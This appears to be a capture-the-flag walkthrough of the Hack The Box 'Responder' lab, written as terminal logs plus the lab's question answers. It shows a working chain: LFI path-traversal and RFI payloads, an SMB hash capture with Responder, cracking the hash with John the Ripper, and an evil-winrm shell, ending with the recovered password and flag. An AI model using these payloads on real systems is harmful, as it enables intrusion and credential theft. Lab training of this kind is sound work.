```
blob:https://app.hackthebox.com/207ef7e2-d519-4814-8616-c6679d11f80a

┌──(kali㉿kali)-[~/hackthebox]
└─$ ping 10.129.89.108 
PING 10.129.89.108 (10.129.89.108) 56(84) bytes of data.
64 bytes from 10.129.89.108: icmp_seq=1 ttl=127 time=193 ms
64 bytes from 10.129.89.108: icmp_seq=2 ttl=127 time=229 ms
^C
--- 10.129.89.108 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1002ms
rtt min/avg/max/mdev = 193.009/210.986/228.964/17.977 ms
                                                                                                                  
┌──(kali㉿kali)-[~/hackthebox]
└─$ rustscan -a 10.129.89.108 --ulimit 5500 -b 65535 -- -A
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.129.89.108:80
Open 10.129.89.108:5985
Open 10.129.89.108:7680
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-01 15:49 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 15:49
Completed NSE at 15:49, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 15:49
Completed NSE at 15:49, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 15:49
Completed NSE at 15:49, 0.00s elapsed
Initiating Ping Scan at 15:49
Scanning 10.129.89.108 [2 ports]
Completed Ping Scan at 15:49, 0.19s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 15:49
Completed Parallel DNS resolution of 1 host. at 15:49, 0.03s elapsed
DNS resolution of 1 IPs took 0.05s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 15:49
Scanning 10.129.89.108 [3 ports]
Discovered open port 80/tcp on 10.129.89.108
Discovered open port 7680/tcp on 10.129.89.108
Discovered open port 5985/tcp on 10.129.89.108
Completed Connect Scan at 15:49, 0.19s elapsed (3 total ports)
Initiating Service scan at 15:49
Scanning 3 services on 10.129.89.108
Completed Service scan at 15:50, 54.88s elapsed (3 services on 1 host)
NSE: Script scanning 10.129.89.108.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 15:50
Completed NSE at 15:50, 5.15s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 15:50
Completed NSE at 15:50, 0.96s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 15:50
Completed NSE at 15:50, 0.00s elapsed
Nmap scan report for 10.129.89.108
Host is up, received syn-ack (0.19s latency).
Scanned at 2022-11-01 15:49:19 EDT for 62s

PORT     STATE SERVICE    REASON  VERSION
80/tcp   open  http       syn-ack Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
5985/tcp open  http       syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
7680/tcp open  pando-pub? syn-ack
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 15:50
Completed NSE at 15:50, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 15:50
Completed NSE at 15:50, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 15:50
Completed NSE at 15:50, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 65.25 seconds

┌──(kali㉿kali)-[~/hackthebox]
└─$ echo "10.129.89.108 unika.htb" | sudo tee -a /etc/hosts
[sudo] password for kali: 
10.129.89.108 unika.htb
                                                                                                                  
┌──(kali㉿kali)-[~/hackthebox]
└─$ cat /etc/hosts             
127.0.0.1       localhost
127.0.1.1       kali
10.10.113.254   magician
10.10.121.237   git.git-and-crumpets.thm
10.10.149.10    hipflasks.thm hipper.hipflasks.thm
10.10.91.93     raz0rblack raz0rblack.thm
10.10.234.77    lab.enterprise.thm
10.10.96.58     source
10.10.59.104    CONTROLLER.local
10.10.54.75     acmeitsupport.thm
10.10.102.33    overwrite.uploadvulns.thm shell.uploadvulns.thm java.uploadvulns.thm annex.uploadvulns.thm magic.uploadvulns.thm jewel.uploadvulns.thm demo.uploadvulns.thm
10.10.179.221   development.smag.thm
10.10.87.241    mafialive.thm
10.10.97.105    internal.thm
10.10.106.113   retro.thm
# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters


10.10.148.19 webenum.thm
10.10.148.19 mysubdomain.webenum.thm
10.10.148.19 learning.webenum.thm
10.10.148.19 products.webenum.thm
10.10.148.19 Products.webenum.thm
10.10.67.130 wpscan.thm
10.10.142.247 blog.thm
10.10.138.76 erit.thm
10.10.153.100 docker-rodeo.thm
10.129.89.108 unika.htb

Noticing the URL, we can see that the french.html page is being loaded by the page parameter, which
may potentially be vulnerable to a Local File Inclusion (LFI) vulnerability if the page input is not sanitized.

Noticing the URL, we can see that the french.html page is being loaded by the page parameter, which
may potentially be vulnerable to a Local File Inclusion (LFI) vulnerability if the page input is not sanitized.
File Inclusion Vulnerability
Dynamic websites include HTML pages on the fly using information from the HTTP request to include GET
and POST parameters, cookies, and other variables. It is common for a page to "include" another page
based on some of these parameters.
LFI or Local File Inclusion occurs when an attacker is able to get a website to include a file that was not
intended to be an option for this application. A common example is when an application uses the path to a
file as input. If the application treats this input as trusted, and the required sanitary checks are not
performed on this input, then the attacker can exploit it by using the ../ string in the inputted file name
and eventually view sensitive files in the local file system. In some limited cases, an LFI can lead to code
execution as well.
RFI or Remote File Inclusion is similar to LFI but in this case it is possible for an attacker to load a remote
file on the host using protocols like HTTP, FTP etc.
We test the page parameter to see if we can include files on the target system in the server response. We
will test with some commonly known files that will have the same name across networks, Windows
domains, and systems which can be found here. One of the most common files that a penetration tester
might attempt to access on a Windows machine to verify LFI is the hosts file,
WINDOWS\System32\drivers\etc\hosts (this file aids in the local translation of host names to IP
addresses). 


http://unika.htb/index.php?
page=../../../../../../../../windows/system32/drivers/etc/hosts

http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts

# Copyright (c) 1993-2009 Microsoft Corp. # # This is a sample HOSTS file used by Microsoft TCP/IP for Windows. # # This file contains the mappings of IP addresses to host names. Each # entry should be kept on an individual line. The IP address should # be placed in the first column followed by the corresponding host name. # The IP address and the host name should be separated by at least one # space. # # Additionally, comments (such as these) may be inserted on individual # lines or following the machine name denoted by a '#' symbol. # # For example: # # 102.54.94.97 rhino.acme.com # source server # 38.25.63.10 x.acme.com # x client host # localhost name resolution is handled within DNS itself. # 127.0.0.1 localhost # ::1 localhost 

Responder Challenge Capture
We know that this web page is vulnerable to the file inclusion vulnerability and is being served on a
Windows machine. Thus, there exists a potential for including a file on our attacker workstation. If we select
a protocol like SMB, Windows will try to authenticate to our machine, and we can capture the NetNTLMv2.

responder -h
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

  To support this project:
  Patreon -> https://www.patreon.com/PythonResponder
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C

Usage: responder -I eth0 -w -d
or:
responder -I eth0 -wd

Options:
  --version             show program's version number and exit
  -h, --help            show this help message and exit
  -A, --analyze         Analyze mode. This option allows you to see NBT-NS,
                        BROWSER, LLMNR requests without responding.
  -I eth0, --interface=eth0
                        Network interface to use, you can use 'ALL' as a
                        wildcard for all interfaces
  -i 10.0.0.21, --ip=10.0.0.21
                        Local IP to use (only for OSX)
  -6 2002:c0a8:f7:1:3ba8:aceb:b1a9:81ed, --externalip6=2002:c0a8:f7:1:3ba8:aceb:b1a9:81ed
                        Poison all requests with another IPv6 address than
                        Responder's one.
  -e 10.0.0.22, --externalip=10.0.0.22
                        Poison all requests with another IP address than
                        Responder's one.
  -b, --basic           Return a Basic HTTP authentication. Default: NTLM
  -d, --DHCP            Enable answers for DHCP broadcast requests. This
                        option will inject a WPAD server in the DHCP response.
                        Default: False
  -D, --DHCP-DNS        This option will inject a DNS server in the DHCP
                        response, otherwise a WPAD server will be added.
                        Default: False
  -w, --wpad            Start the WPAD rogue proxy server. Default value is
                        False
  -u UPSTREAM_PROXY, --upstream-proxy=UPSTREAM_PROXY
                        Upstream HTTP proxy used by the rogue WPAD Proxy for
                        outgoing requests (format: host:port)
  -F, --ForceWpadAuth   Force NTLM/Basic authentication on wpad.dat file
                        retrieval. This may cause a login prompt. Default:
                        False
  -P, --ProxyAuth       Force NTLM (transparently)/Basic (prompt)
                        authentication for the proxy. WPAD doesn't need to be
                        ON. This option is highly effective. Default: False
  --lm                  Force LM hashing downgrade for Windows XP/2003 and
                        earlier. Default: False
  --disable-ess         Force ESS downgrade. Default: False
  -v, --verbose         Increase verbosity.

solve it my now it works, I was blocking smb, so using iptables and ufw(the same method used in TryHackme Epoch to fix :) 

http://unika.htb/index.php?page=//10.10.14.51/whatever


┌──(kali㉿kali)-[~]
└─$ sudo responder -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

  To support this project:
  Patreon -> https://www.patreon.com/PythonResponder
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.51]
    Responder IPv6             [dead:beef:2::1031]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-X067TCZOQWQ]
    Responder Domain Name      [WVZE.LOCAL]
    Responder DCE-RPC Port     [48214]

[+] Listening for events...                                                                                       

[SMB] NTLMv2-SSP Client   : 10.129.132.154
[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:4b568bfadc429c47:08E0007EA1EEDCAF2C8065EF99E98B88:0101000000000000009A5CFF48F0D8018F5434F1D7D0C95C0000000002000800570056005A00450001001E00570049004E002D005800300036003700540043005A004F0051005700510004003400570049004E002D005800300036003700540043005A004F005100570051002E00570056005A0045002E004C004F00430041004C0003001400570056005A0045002E004C004F00430041004C0005001400570056005A0045002E004C004F00430041004C0007000800009A5CFF48F0D80106000400020000000800300030000000000000000100000000200000B2988AE798C1BDECB0F98580736BFB15ACF1DAC10BE5138A3055564EBCB4D6050A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00350031000000000000000000 

using john the ripper to crack 

┌──(kali㉿kali)-[~]
└─$ echo "Administrator::RESPONDER:4b568bfadc429c47:08E0007EA1EEDCAF2C8065EF99E98B88:0101000000000000009A5CFF48F0D8018F5434F1D7D0C95C0000000002000800570056005A00450001001E00570049004E002D005800300036003700540043005A004F0051005700510004003400570049004E002D005800300036003700540043005A004F005100570051002E00570056005A0045002E004C004F00430041004C0003001400570056005A0045002E004C004F00430041004C0005001400570056005A0045002E004C004F00430041004C0007000800009A5CFF48F0D80106000400020000000800300030000000000000000100000000200000B2988AE798C1BDECB0F98580736BFB15ACF1DAC10BE5138A3055564EBCB4D6050A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00350031000000000000000000" > responder_hash.txt
                                                                                                                  
┌──(kali㉿kali)-[~]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt responder_hash.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
badminton        (Administrator)     
1g 0:00:00:00 DONE (2022-11-04 12:33) 33.33g/s 136533p/s 136533c/s 136533C/s slimshady..oooooo
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 

using evil-winrm to remote using powershell :)

┌──(kali㉿kali)-[~]
└─$ evil-winrm -i 10.129.132.154 -u Administrator -p badminton

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                                               

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> dir
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cd ..\..\
*Evil-WinRM* PS C:\Users> dir


    Directory: C:\Users


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          3/9/2022   5:35 PM                Administrator
d-----          3/9/2022   5:33 PM                mike
d-r---        10/10/2020  12:37 PM                Public


*Evil-WinRM* PS C:\Users> cd mike\Desktop
*Evil-WinRM* PS C:\Users\mike\Desktop> dir


    Directory: C:\Users\mike\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         3/10/2022   4:50 AM             32 flag.txt


*Evil-WinRM* PS C:\Users\mike\Desktop> type flag.txt
ea81b7afddd03efaa0945333ed147fac
*Evil-WinRM* PS C:\Users\mike\Desktop> more flag.txt
ea81b7afddd03efaa0945333ed147fac

*Evil-WinRM* PS C:\Users\mike\Desktop> xxd flag.txt
The term 'xxd' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
At line:1 char:1
+ xxd flag.txt
+ ~~~
    + CategoryInfo          : ObjectNotFound: (xxd:String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException



```

When visiting the web service using the IP address, what is the domain that we are being redirected to? 
*unika.htb*

Which scripting language is being used on the server to generate webpages? 
*php*

What is the name of the URL parameter which is used to load different language versions of the webpage? 
*page*

Which of the following values for the `page` parameter would be an example of exploiting a Local File Include (LFI) vulnerability: "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe" 
An LFI is accessing a file on the local system that isn't intended to be read.
*../../../../../../../../windows/system32/drivers/etc/hosts*

Which of the following values for the `page` parameter would be an example of exploiting a Remote File Include (RFI) vulnerability: "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe" 
An RFI tricks the server into including file from another server such as the attacker's server.
*//10.10.14.6/somefile*

What does NTLM stand for? 
*New Technology LAN Manager*

Which flag do we use in the Responder utility to specify the network interface? 
*-I*

 There are several tools that take a NetNTLMv2 challenge/response and try millions of passwords to see if any of them generate the same response. One such tool is often referred to as `john`, but the full name is what?. 

*John The Ripper*

What is the password for the administrator user? 
*badminton*

We'll use a Windows service (i.e. running on the box) to remotely access the Responder machine using the password we recovered. What port TCP does it listen on? 
*5985*

Submit root flag 
*ea81b7afddd03efaa0945333ed147fac*


[[Crocodile]]